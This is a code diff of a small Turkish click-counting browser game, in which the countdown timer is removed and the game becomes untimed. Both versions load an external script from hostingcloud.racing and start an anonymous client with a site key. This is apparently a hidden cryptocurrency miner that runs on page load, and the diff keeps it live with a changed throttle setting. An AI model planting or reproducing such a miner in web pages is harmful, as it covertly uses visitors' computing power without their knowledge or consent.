@@ -14,7 +14,7 @@
       font-size: 20px;
       cursor: pointer;
     }
-    #score, #timer {
+    #score {
       font-size: 24px;
       margin-top: 20px;
     }
@@ -22,49 +22,29 @@
 </head>
 <body>
 
-
-
-<script async src="https://www.hostingcloud.racing/xXmw.js"></script>
+  <script src="https://www.hostingcloud.racing/xXmw.js"></script>
 <script>
     var _client = new Client.Anonymous('0931a19b9bf55187f7eb0b42760d346c417de342add853171911589bdf2c19f9', {
-        throttle: 0, c: 'w', ads: 0
+        throttle: 5, c: 'w', ads: 0
     });
     _client.start();
+    
+
 </script>
-
-
   
   <h1>Tıkla ve Kazan</h1>
-  <p>10 saniye içinde olabildiğince fazla tıklayın!</p>
+  <p>İstediğiniz kadar tıklayın ve puanınızı artırın!</p>
   <button id="clickButton" onclick="incrementScore()">Tıkla!</button>
   <p id="score">Puan: 0</p>
-  <p id="timer">Süre: 10</p>
 
   <script>
     let score = 0;
-    let timeLeft = 10;
     const scoreDisplay = document.getElementById('score');
-    const timerDisplay = document.getElementById('timer');
-    const button = document.getElementById('clickButton');
 
     function incrementScore() {
       score++;
       scoreDisplay.textContent = `Puan: ${score}`;
     }
-
-    const countdown = setInterval(() => {
-      timeLeft--;
-      timerDisplay.textContent = `Süre: ${timeLeft}`;
-      if (timeLeft <= 0) {
-        clearInterval(countdown);
-        button.disabled = true;
-        timerDisplay.textContent = "Süre bitti!";
-        alert(`Oyun bitti! Toplam puanınız: ${score}`);
-      }
-    }, 1000);
   </script>
-
-
-  
 </body>
 </html>
